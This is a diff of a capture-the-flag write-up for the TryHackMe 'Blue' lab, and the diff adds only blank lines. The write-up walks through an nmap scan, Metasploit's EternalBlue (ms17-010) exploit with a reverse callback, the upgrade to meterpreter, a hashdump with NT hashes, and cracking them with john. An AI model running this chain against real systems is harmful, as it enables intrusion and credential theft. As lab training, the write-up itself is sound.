@@ -23,6 +23,7 @@ Badges: [https://tryhackme.com/ZishanAdThandar/badges/blue](https://tryhackme.co
 Output:
 
 ```bash
+
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-27 10:57 IST
 Nmap scan report for 10.10.248.180
 Host is up (0.20s latency).
@@ -52,6 +53,7 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 34.07 seconds
 ```
+
 - Question `How many ports are open with a port number under 1000?` Answer `3`
 - Question `What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)` Answer `ms17-010`
 
@@ -62,6 +64,7 @@ Nmap done: 1 IP address (1 host up) scanned in 34.07 seconds
 Output:
 
 ```bash
+
 Matching Modules
 ================
 
@@ -76,6 +79,7 @@ Matching Modules
 
 Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
 ```
+
 - Question `Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)` Ansswer `exploit/windows/smb/ms17_010_eternalblue`
 - To use the exploit we typed `use exploit/windows/smb/ms17_010_eternalblue` command
 - After checkinh options with `options` command, we found that we need to add rhosts with `set rhosts 10.10.248.180` and `set lhost tun0` command
@@ -89,6 +93,7 @@ Interact with a module by name or index. For example info 4, use 4 or use exploi
 Output:
 
 ```bash
+
 Matching Modules
 ================
 
@@ -99,11 +104,13 @@ Matching Modules
 
 Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
 ```
+
 - Question `If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)` Answer `post/multi/manage/shell_to_meterpreter`
 - Question `Select this (use MODULE_PATH). Show options, what option are we required to change?` Answer `SESSION`
 - Run the module after setting session. If fails run it again, it will connect.
 
 ```bash
+
 meterpreter > shell
 Process 808 created.
 Channel 1 created.
@@ -134,6 +141,7 @@ Process List
 ...............................................................................
 ...............................................................................
 ```
+
 - Use `migrate PROCESS_ID` to mmigrate.
 
 ## Cracking
@@ -142,11 +150,13 @@ Process List
 Output:
 
 ```bash
+
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ```
+
 - Question `Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?` Answer `Jon`
 - Save hashes in a file named `hash.txt` and use `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` to crack the hash.
 - Question `Copy this password hash to a file and research how to crack it. What is the cracked password?` Answer `*******`
@@ -156,6 +166,7 @@ Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 - We can goto `C:\\` abd get first flag using `cat flag1.txt`.
 
 ```bash
+
 meterpreter > pwd
 C:\Windows\system32
 meterpreter > cd C:\\
@@ -182,9 +193,11 @@ Mode              Size   Type  Last modified              Name
 meterpreter > cat flag1.txt
 flag{********************************}
 ```
+
 - We can use `search -f flag2.txt` and `search -f flag2.txt` to find second and third flag to submit, as we already know the first one.
 
 ```bash
+
 meterpreter > search -f flag2.txt
 Found 1 result...
 =================
@@ -208,6 +221,7 @@ c:\Users\Jon\Documents\flag3.txt  37            2019-03-18 00:56:36 +0530
 meterpreter > cat "c:\Users\Jon\Documents\flag3.txt"
 flag{********************************}
 ```
+
 - flag1 : `flag{********************************}` flag2: `flag{********************************}` flag3:`flag{********************************}`
 
 Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)
